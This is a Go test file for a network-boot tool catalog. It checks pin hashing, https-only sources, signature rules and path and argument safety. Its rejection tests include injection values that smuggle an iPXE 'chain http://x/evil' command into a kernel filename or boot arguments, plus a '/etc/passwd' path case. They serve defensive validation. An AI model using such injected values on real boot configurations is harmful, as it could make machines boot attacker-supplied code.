package catalog_test

import (
	"bytes"
	"go/format"
	"os"
	"slices"
	"strings"
	"testing"

	"go.jacaudi.dev/hephaestus/internal/catalog"
	"go.jacaudi.dev/hephaestus/internal/catalog/catalogtest"
	"go.jacaudi.dev/hephaestus/internal/fleet"
)

const (
	hashABC  = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
	hashFile = "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881"
)

// toolPin is the object the PinID vectors hash; fileSize is the one field the
// vectors vary.
func toolPin(fileSize int64) []catalog.ObjectPin {
	return []catalog.ObjectPin{{
		URL:    "https://upstream.example.test/tool.zip",
		Size:   3,
		SHA256: hashABC,
		Files:  []catalog.FilePin{{Path: "bin/tool.efi", Size: fileSize, SHA256: hashFile}},
	}}
}

func TestPinID_Stable(t *testing.T) {
	signed := toolPin(1)
	signed[0].Signer = "0123456789ABCDEF"
	signed[0].Files[0].EFIStub = true

	tests := []struct {
		name    string
		objects []catalog.ObjectPin
		want    string
	}{
		{"vector", toolPin(1), "43a4f134ae5e"},
		{"file size changes the id", toolPin(2), "00c0ecd023dc"},
		{"signer and EFI stub do not", signed, "43a4f134ae5e"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := catalog.PinID(tt.objects); got != tt.want {
				t.Errorf("PinID = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestSpecs_Valid(t *testing.T) {
	if _, err := catalog.New(catalog.Specs(), nil); err != nil {
		t.Fatalf("New(Specs(), nil): %v", err)
	}
	for _, s := range catalog.Specs() {
		if a := fleet.Arch(s.Arch); a != fleet.ArchAMD64 && a != fleet.ArchARM64 {
			t.Errorf("%v: arch %q is not a fleet arch", s.Key(), s.Arch)
		}
	}
}

// mutate returns a copy of the fixture's first spec with fn applied.
func mutate(t *testing.T, fn func(*catalog.Spec)) catalog.Spec {
	t.Helper()
	entries := catalogtest.New(t, "https://upstream.example.test").Catalog.Entries()
	for i := range entries {
		if entries[i].Entry == "tlive" && entries[i].Arch == "amd64" {
			spec := entries[i].Spec
			fn(&spec)
			return spec
		}
	}
	t.Fatal("fixture has no tlive amd64")
	return catalog.Spec{}
}

// setKernel renames tlive's kernel file everywhere a spec names it, so a
// row fails for the new name's own sake and not for an unlisted boot file.
func setKernel(s *catalog.Spec, name string) {
	s.Objects[0].Files[0] = name
	s.Boot.Kernel = name
}

// setSecond does the same for the second stage.
func setSecond(s *catalog.Spec, name string) {
	s.Objects[0].Files[2] = name
	s.Boot.Second = name
}

func TestNew_RejectsBadSpecs(t *testing.T) {
	const sums = "https://upstream.example.test/SUMS"
	const sig = "https://upstream.example.test/x.asc"
	tests := []struct {
		name string
		want string // a substring of the error the rule reports
		fn   func(*catalog.Spec)
	}{
		{"empty entry", "entry", func(s *catalog.Spec) { s.Entry = "" }},
		{"entry not path safe", "entry", func(s *catalog.Spec) { s.Entry = "a/b" }},
		{"empty version", "version", func(s *catalog.Spec) { s.Version = "" }},
		{"version not path safe", "version", func(s *catalog.Spec) { s.Version = "1 2" }},
		{"unknown arch", "arch", func(s *catalog.Spec) { s.Arch = "riscv" }},
		{"unknown recipe", "unknown recipe", func(s *catalog.Spec) { s.Recipe = "nope" }},
		{"no platforms", "no platforms", func(s *catalog.Spec) { s.Platforms = nil }},
		{"unknown platform", "unknown platform", func(s *catalog.Spec) { s.Platforms = []catalog.Platform{"linux"} }},
		{"no objects", "no objects", func(s *catalog.Spec) { s.Objects = nil }},
		{"http object", "not https", func(s *catalog.Spec) { s.Objects[0].URL = "http://upstream.example.test/x.zip" }},
		{"unknown container", "unknown container", func(s *catalog.Spec) { s.Objects[0].Container = "tar" }},
		{"unsafe file", "clean relative path", func(s *catalog.Spec) { s.Objects[0].Files[0] = "../live/vmlinuz" }},
		{"absolute file", "clean relative path", func(s *catalog.Spec) { s.Objects[0].Files[0] = "/live/vmlinuz" }},
		{"file with newline", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/vm\nchain http://x/evil") }},
		{"file with carriage return", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/vm\rboot") }},
		{"file with tab", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/vm\tx") }},
		{"file with space", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/my kernel") }},
		{"file with dollar", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/${next}") }},
		{"file with hash", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/#x") }},
		{"file with non-ASCII", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/vmlinüz") }},
		{"file with DEL", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/vm\x7f") }},
		{"second with newline", "script-safe", func(s *catalog.Spec) { setSecond(s, "live/fs\nboot") }},
		{"args with newline", "args", func(s *catalog.Spec) { s.Args = "boot=live\nchain http://x/evil" }},
		{"args with carriage return", "args", func(s *catalog.Spec) { s.Args = "boot=live\rboot" }},
		{"args with tab", "args", func(s *catalog.Spec) { s.Args = "boot=live\tx" }},
		{"args with dollar", "args", func(s *catalog.Spec) { s.Args = "boot=live ${net0/mac}" }},
		{"args with non-ASCII", "args", func(s *catalog.Spec) { s.Args = "boot=live ü" }},
		{"args with DEL", "args", func(s *catalog.Spec) { s.Args = "boot=live\x7f" }},
		{"args with semicolon", "carry ';'", func(s *catalog.Spec) { s.Args = "quiet ; chain http://x/evil" }},
		{"args with pipe", "carry '|'", func(s *catalog.Spec) { s.Args = "quiet || chain http://x/evil" }},
		{"args with ampersand", "carry '&'", func(s *catalog.Spec) { s.Args = "quiet && chain http://x/evil" }},
		{"args with hash", "carry '#'", func(s *catalog.Spec) { s.Args = "quiet #x" }},
		{"entry dot", "entry", func(s *catalog.Spec) { s.Entry = "." }},
		{"entry dot dot", "entry", func(s *catalog.Spec) { s.Entry = ".." }},
		{"version dot", "version", func(s *catalog.Spec) { s.Version = "." }},
		{"version dot dot", "version", func(s *catalog.Spec) { s.Version = ".." }},
		{"https scheme only", "not https", func(s *catalog.Spec) { s.Objects[0].URL = "https://" }},
		{"https no host", "not https", func(s *catalog.Spec) { s.Objects[0].URL = "https:///x.zip" }},
		{"sig url https scheme only", "not https", func(s *catalog.Spec) {
			s.Objects[0].Signature = catalog.Signature{SigURL: "https://", Key: "x.asc"}
		}},
		{"checksums url https scheme only", "not https", func(s *catalog.Spec) {
			s.Objects[0].Signature = catalog.Signature{TOFU: true, ChecksumsURL: "https://", ChecksumAlgo: "sha256"}
		}},
		{"duplicate file", "listed twice", func(s *catalog.Spec) { s.Objects[0].Files[1] = s.Objects[0].Files[0] }},
		{"kernel not listed", "boot file", func(s *catalog.Spec) { s.Boot.Kernel = "live/other" }},
		{"initrd not listed", "boot file", func(s *catalog.Spec) { s.Boot.Initrds = []string{"live/other"} }},
		{"second not listed", "boot file", func(s *catalog.Spec) { s.Boot.Second = "live/other" }},
		{"live-boot without second", "second stage", func(s *catalog.Spec) { s.Boot.Second = "" }},
		{"chain with initrd", "chain recipe", func(s *catalog.Spec) { s.Recipe, s.Boot.Second, s.Args = catalog.RecipeChain, "", "" }},
		{"chain with second", "chain recipe", func(s *catalog.Spec) { s.Recipe, s.Boot.Initrds, s.Args = catalog.RecipeChain, nil, "" }},
		{"chain with args", "chain recipe", func(s *catalog.Spec) { s.Recipe, s.Boot.Initrds, s.Boot.Second = catalog.RecipeChain, nil, "" }},
		{"neither tofu nor signed", "neither TOFU", func(s *catalog.Spec) { s.Objects[0].Signature = catalog.Signature{} }},
		{"tofu and signed", "both TOFU", func(s *catalog.Spec) {
			s.Objects[0].Signature = catalog.Signature{TOFU: true, SigURL: sig, Key: "x.asc"}
		}},
		{"signature without key", "neither TOFU", func(s *catalog.Spec) {
			s.Objects[0].Signature = catalog.Signature{SigURL: sig}
		}},
		{"http sig url", "not https", func(s *catalog.Spec) {
			s.Objects[0].Signature = catalog.Signature{SigURL: "http://upstream.example.test/x.asc", Key: "x.asc"}
		}},
		{"http checksums url", "not https", func(s *catalog.Spec) {
			s.Objects[0].Signature = catalog.Signature{TOFU: true, ChecksumsURL: "http://upstream.example.test/SUMS", ChecksumAlgo: "sha256"}
		}},
		{"checksums without algo", "ChecksumAlgo", func(s *catalog.Spec) {
			s.Objects[0].Signature = catalog.Signature{TOFU: true, ChecksumsURL: sums}
		}},
		{"algo without checksums", "ChecksumAlgo", func(s *catalog.Spec) {
			s.Objects[0].Signature = catalog.Signature{TOFU: true, ChecksumAlgo: "sha256"}
		}},
		{"unknown algo", "not sha256 or sha1", func(s *catalog.Spec) {
			s.Objects[0].Signature = catalog.Signature{TOFU: true, ChecksumsURL: sums, ChecksumAlgo: "md5"}
		}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			spec := mutate(t, tt.fn)
			_, err := catalog.New([]catalog.Spec{spec}, nil)
			if err == nil {
				t.Fatalf("New accepted %+v", spec)
			}
			if !strings.Contains(err.Error(), tt.want) {
				t.Errorf("error %q lacks %q", err, tt.want)
			}
		})
	}
}

func TestNew_RejectsDuplicateKeys(t *testing.T) {
	spec := mutate(t, func(*catalog.Spec) {})
	if _, err := catalog.New([]catalog.Spec{spec, spec}, nil); err == nil {
		t.Fatal("New accepted two specs with one key")
	}
}

func TestSpecs_NoAutonuke(t *testing.T) {
	addr := testAddr(t)
	for _, s := range catalog.Specs() {
		if strings.Contains(s.Args, "autonuke") {
			t.Errorf("%v: Args contain autonuke", s.Key())
		}
		if strings.Contains(s.Script(addr), "autonuke") {
			t.Errorf("%v: script contains autonuke", s.Key())
		}
	}
}

func TestSpecs_TOFUExplicit(t *testing.T) {
	var got []string
	for _, s := range catalog.Specs() {
		if slices.ContainsFunc(s.Objects, func(o catalog.ObjectSpec) bool { return o.Signature.TOFU }) && !slices.Contains(got, s.Entry) {
			got = append(got, s.Entry)
		}
	}
	slices.Sort(got)
	if want := []string{"memtest86plus", "shredos", "uefishell"}; !slices.Equal(got, want) {
		t.Errorf("TOFU entries = %v, want %v", got, want)
	}
}

func TestSpecs_TenKeys(t *testing.T) {
	var got []catalog.Key
	for _, s := range catalog.Specs() {
		got = append(got, s.Key())
	}
	want := []catalog.Key{
		{Entry: "memtest86plus", Arch: "amd64"}, {Entry: "memtest86plus", Arch: "arm64"},
		{Entry: "systemrescue", Arch: "amd64"},
		{Entry: "clonezilla", Arch: "amd64"},
		{Entry: "gparted", Arch: "amd64"},
		{Entry: "shredos", Arch: "amd64"},
		{Entry: "grml", Arch: "amd64"}, {Entry: "grml", Arch: "arm64"},
		{Entry: "uefishell", Arch: "amd64"}, {Entry: "uefishell", Arch: "arm64"},
	}
	less := func(a, b catalog.Key) int {
		if c := strings.Compare(a.Entry, b.Entry); c != 0 {
			return c
		}
		return strings.Compare(a.Arch, b.Arch)
	}
	slices.SortFunc(got, less)
	slices.SortFunc(want, less)
	if !slices.Equal(got, want) {
		t.Errorf("keys = %v, want %v", got, want)
	}
}

func TestPins_Complete(t *testing.T) {
	pins, absent := catalog.Pins(), catalog.Absent()
	for _, s := range catalog.Specs() {
		_, pinned := pins[s.Key()]
		reason, missing := absent[s.Key()]
		if pinned == missing {
			t.Errorf("%v: pinned=%t absent=%t, want exactly one", s.Key(), pinned, missing)
		}
		if missing && reason == "" {
			t.Errorf("%v: absent with no reason", s.Key())
		}
	}
	if got, want := len(pins)+len(absent), len(catalog.Specs()); got != want {
		t.Errorf("pins + absent = %d keys, want %d (a key has no spec)", got, want)
	}
	if _, err := catalog.Default(); err != nil {
		t.Errorf("Default: %v", err)
	}
}

func TestPinsFile_Formatted(t *testing.T) {
	src, err := os.ReadFile("catalog_pins.go")
	if err != nil {
		t.Fatal(err)
	}
	got, err := format.Source(src)
	if err != nil {
		t.Fatalf("format.Source: %v", err)
	}
	if !bytes.Equal(got, src) {
		t.Error("catalog_pins.go is not gofmt-formatted")
	}
	if !bytes.HasPrefix(src, []byte("// Code generated by cmd/catalogpin; DO NOT EDIT.\n")) {
		t.Error("catalog_pins.go lacks the generated-code header")
	}
}

// fixturePins returns the fixture's specs and pins, ready to be mutated.
func fixturePins(t *testing.T) ([]catalog.Spec, map[catalog.Key]catalog.Pin) {
	t.Helper()
	var specs []catalog.Spec
	pins := map[catalog.Key]catalog.Pin{}
	entries := catalogtest.New(t, "https://upstream.example.test").Catalog.Entries()
	for i := range entries {
		specs = append(specs, entries[i].Spec)
		pins[entries[i].Key()] = entries[i].Pin
	}
	return specs, pins
}

func TestNew_RejectsBadPins(t *testing.T) {
	tlive := catalog.Key{Entry: "tlive", Arch: "amd64"}
	// repin applies fn to tlive amd64's pin and recomputes its id, so a case
	// fails for its own reason and not for a stale id.
	repin := func(fn func(*catalog.Pin)) func(map[catalog.Key]catalog.Pin) {
		return func(pins map[catalog.Key]catalog.Pin) {
			p := pins[tlive]
			fn(&p)
			p.ID = catalog.PinID(p.Objects)
			pins[tlive] = p
		}
	}
	tests := []struct {
		name string
		fn   func(map[catalog.Key]catalog.Pin)
	}{
		{"url differs", repin(func(p *catalog.Pin) { p.Objects[0].URL = "https://elsewhere.example.test/x.zip" })},
		{"file order differs", repin(func(p *catalog.Pin) {
			f := p.Objects[0].Files
			f[0], f[1] = f[1], f[0]
		})},
		{"file missing", repin(func(p *catalog.Pin) { p.Objects[0].Files = p.Objects[0].Files[:2] })},
		{"object missing", repin(func(p *catalog.Pin) { p.Objects = nil })},
		{"id wrong", func(pins map[catalog.Key]catalog.Pin) {
			p := pins[tlive]
			p.ID = "000000000000"
			pins[tlive] = p
		}},
		{"object size zero", repin(func(p *catalog.Pin) { p.Objects[0].Size = 0 })},
		{"file size zero", repin(func(p *catalog.Pin) { p.Objects[0].Files[0].Size = 0 })},
		{"object sha256 short", repin(func(p *catalog.Pin) { p.Objects[0].SHA256 = "abc" })},
		{"file sha256 not hex", repin(func(p *catalog.Pin) { p.Objects[0].Files[0].SHA256 = strings.Repeat("g", 64) })},
		{"file sha256 upper case", repin(func(p *catalog.Pin) { p.Objects[0].Files[0].SHA256 = strings.ToUpper(hashFile) })},
		{"pin without spec", func(pins map[catalog.Key]catalog.Pin) { pins[catalog.Key{Entry: "ghost", Arch: "amd64"}] = pins[tlive] }},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			specs, pins := fixturePins(t)
			tt.fn(pins)
			_, err := catalog.New(specs, pins)
			if err == nil {
				t.Fatal("New accepted the bad pin")
			}
			want := "ghost"
			if tt.name != "pin without spec" {
				want = "tlive"
			}
			if !strings.Contains(err.Error(), want) {
				t.Errorf("error %q does not name %q", err, want)
			}
		})
	}
}

func TestNew_LeavesOutUnpinnedSpecs(t *testing.T) {
	specs, pins := fixturePins(t)
	delete(pins, catalog.Key{Entry: "tlive", Arch: "arm64"})
	c, err := catalog.New(specs, pins)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := c.Lookup("tlive", "arm64"); ok {
		t.Error("Lookup found an unpinned spec")
	}
	if got, want := c.Arches("tlive"), []string{"amd64"}; !slices.Equal(got, want) {
		t.Errorf("Arches(tlive) = %v, want %v", got, want)
	}
}

func TestCatalog_Lookup(t *testing.T) {
	f := catalogtest.New(t, "https://upstream.example.test")
	c := f.Catalog

	e, ok := c.Lookup("tshell", "amd64")
	if !ok {
		t.Fatal("Lookup(tshell, amd64) not found")
	}
	if got, want := e.Tag(), "utility/tshell-amd64:"+e.Pin.ID; got != want {
		t.Errorf("Tag = %q, want %q", got, want)
	}
	if _, ok := c.Lookup("tshell", "riscv"); ok {
		t.Error("Lookup(tshell, riscv) found an entry")
	}
	if !c.Has("tshell") || c.Has("nope") {
		t.Errorf("Has(tshell) = %t, Has(nope) = %t", c.Has("tshell"), c.Has("nope"))
	}
	if got, want := c.Arches("tlive"), []string{"amd64", "arm64"}; !slices.Equal(got, want) {
		t.Errorf("Arches(tlive) = %v, want %v", got, want)
	}
	var keys []catalog.Key
	for _, e := range c.Entries() {
		keys = append(keys, e.Key())
	}
	want := []catalog.Key{
		{Entry: "tlive", Arch: "amd64"}, {Entry: "tlive", Arch: "arm64"},
		{Entry: "tshell", Arch: "amd64"}, {Entry: "tshell", Arch: "arm64"},
	}
	if !slices.Equal(keys, want) {
		t.Errorf("Entries = %v, want %v", keys, want)
	}
}

func TestCatalog_ReturnsCopies(t *testing.T) {
	c := catalogtest.New(t, "https://upstream.example.test").Catalog
	e, _ := c.Lookup("tlive", "amd64")
	e.Platforms[0] = "pcbios"
	e.Pin.Objects[0].Files[0].Path = "scribbled"

	again, _ := c.Lookup("tlive", "amd64")
	if again.Platforms[0] != catalog.PlatformEFI || again.Pin.Objects[0].Files[0].Path == "scribbled" {
		t.Error("mutating a Lookup result changed the catalog")
	}
	s := catalog.Specs()
	s[0].Objects[0].URL = "scribbled"
	if catalog.Specs()[0].Objects[0].URL == "scribbled" {
		t.Error("mutating Specs() changed the compiled-in data")
	}
}

func TestEntry_File(t *testing.T) {
	e, _ := catalogtest.New(t, "https://upstream.example.test").Catalog.Lookup("tlive", "amd64")
	fp, ok := e.File("live/vmlinuz")
	if !ok || fp.Size != int64(len("tlive-kernel-amd64")) {
		t.Errorf("File(live/vmlinuz) = %+v, %t", fp, ok)
	}
	if _, ok := e.File("live/missing"); ok {
		t.Error("File found a path the pin does not hold")
	}
}

func TestEntry_TOFU(t *testing.T) {
	e, _ := catalogtest.New(t, "https://upstream.example.test").Catalog.Lookup("tlive", "amd64")
	if !e.TOFU() {
		t.Error("fixture entry is TOFU")
	}
	e.Objects[0].Signature = catalog.Signature{SigURL: "https://upstream.example.test/x.asc", Key: "x.asc"}
	if e.TOFU() {
		t.Error("a signed entry reports TOFU")
	}
}

func TestParsePlatform(t *testing.T) {
	tests := []struct {
		in   string
		want catalog.Platform
		ok   bool
	}{
		{"efi", catalog.PlatformEFI, true},
		{"pcbios", catalog.PlatformPCBIOS, true},
		{"linux", "", false},
		{"", "", false},
		{"EFI", "", false},
	}
	for _, tt := range tests {
		got, ok := catalog.ParsePlatform(tt.in)
		if got != tt.want || ok != tt.ok {
			t.Errorf("ParsePlatform(%q) = %q, %t; want %q, %t", tt.in, got, ok, tt.want, tt.ok)
		}
	}
}

func TestValidPath(t *testing.T) {
	tests := []struct {
		in   string
		want bool
	}{
		{"live/vmlinuz", true},
		{"EFI/Shell/X64/Shell.efi", true},
		{"mt86p_900_x86_64", true},
		{"", false},
		{"/etc/passwd", false},
		{"a/../b", false},
		{"../a", false},
		{"a//b", false},
		{"./a", false},
		{"a/", false},
		{".", false},
	}
	for _, tt := range tests {
		if got := catalog.ValidPath(tt.in); got != tt.want {
			t.Errorf("ValidPath(%q) = %t, want %t", tt.in, got, tt.want)
		}
	}
}

func TestEntry_MinRAM(t *testing.T) {
	e, _ := catalogtest.New(t, "https://upstream.example.test").Catalog.Lookup("tlive", "amd64")
	if got, want := e.MinRAMBytes(), int64(768<<20); got != want {
		t.Errorf("tlive amd64 MinRAMBytes = %d, want %d", got, want)
	}

	// The rounding boundary: an exact multiple stays, one byte over goes up.
	for _, tt := range []struct {
		size, want int64
	}{
		{256 << 20, 768 << 20},
		{256<<20 + 1, 1024 << 20},
	} {
		e := catalog.Entry{Pin: catalog.Pin{Objects: []catalog.ObjectPin{{Files: []catalog.FilePin{{Size: tt.size}}}}}}
		if got := e.MinRAMBytes(); got != tt.want {
			t.Errorf("MinRAMBytes with a %d byte file = %d, want %d", tt.size, got, tt.want)
		}
	}
}

func TestSpec_Supports(t *testing.T) {
	c := catalogtest.New(t, "https://upstream.example.test").Catalog
	tests := []struct {
		arch     string
		platform catalog.Platform
		want     bool
	}{
		{"amd64", catalog.PlatformEFI, true},
		{"amd64", catalog.PlatformPCBIOS, true},
		{"arm64", catalog.PlatformEFI, true},
		{"arm64", catalog.PlatformPCBIOS, false},
		{"amd64", "linux", false},
	}
	for _, tt := range tests {
		e, ok := c.Lookup("tlive", tt.arch)
		if !ok {
			t.Fatalf("tlive %s not in the fixture", tt.arch)
		}
		if got := e.Supports(tt.platform); got != tt.want {
			t.Errorf("tlive %s Supports(%q) = %t, want %t", tt.arch, tt.platform, got, tt.want)
		}
	}
}
